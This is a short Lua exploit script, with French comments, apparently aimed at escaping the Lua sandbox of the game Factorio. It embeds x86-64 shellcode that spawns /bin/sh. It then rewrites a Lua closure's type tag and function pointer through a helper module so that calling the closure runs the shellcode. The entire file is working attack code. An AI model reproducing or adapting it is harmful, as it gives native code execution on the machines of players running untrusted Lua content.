local to_write = function(a, b, c, d, e, f)
    print("Try again bruh")
end

to_write(1,2,3,4,5,6)

collectgarbage("stop")

local b = require('bytecode_factorio');

-- Valeur à écrire dans le tag de la tvalue à transformer en fonction C
--local c_closure_tag = b.ptr2num("\38"..("\0"):rep(2))
local c_closure_tag = b.ptr2num("\38\17"..("\0"):rep(2))

local magic_sauce = '\247\230\80\72\191\47\98\105\110\47\47\115\104\87\72\137\231\176\59\15\5'

-- Adresse du shellcode
local destination = b.pointer_add(b.address_of(magic_sauce), 24)

print("[shellcode] is stored at : ", b.addr_to_string(destination))

destination = b.ptr2num(destination)

-- Adresse de la Closure que l'on va modifier pour appeler le shellcode
local tval_addr = b.address_of(to_write)

print("[to_write] is stored at (TValue*) : ", b.addr_to_string(tval_addr), " addr from %p : ", to_write)
local cl_addr = tval_addr --b.read_memory(tval_addr, b.sizeof_pointer)

print("[Closure*] addr : ", b.addr_to_string(cl_addr))

-- Tag indiquant le type de la Closure (lua closure initialement)
local tag_addr = b.pointer_add(tval_addr, b.sizeof_pointer)

-- Adresse contenant le pointeur de fonction a re-écrire
local f_addr = b.pointer_add(cl_addr, 24)

print("[Closure*] function pointer stored at : ", b.addr_to_string(f_addr))

-- Valeur du pointeur de fonction
local proto_addr = b.read_memory(f_addr, b.sizeof_pointer)

print("[Closure*] trying to read the function pointer manually : ", b.addr_to_string(proto_addr))
debug.debug()
print("Rewriting tag")
b.write_tvalue(tag_addr, c_closure_tag)
print("Wrote tag")

print("Rewriting function pointer")
debug.debug()
b.write_tvalue(f_addr, destination)
print("Wrote function pointer")

local proto_addr = b.read_memory(f_addr, b.sizeof_pointer)
print("[Closure*] trying to read the function pointer manually : ", b.addr_to_string(proto_addr))
print("Calling crafted function")
to_write()
print("Called")

print("[to_write]", to_write)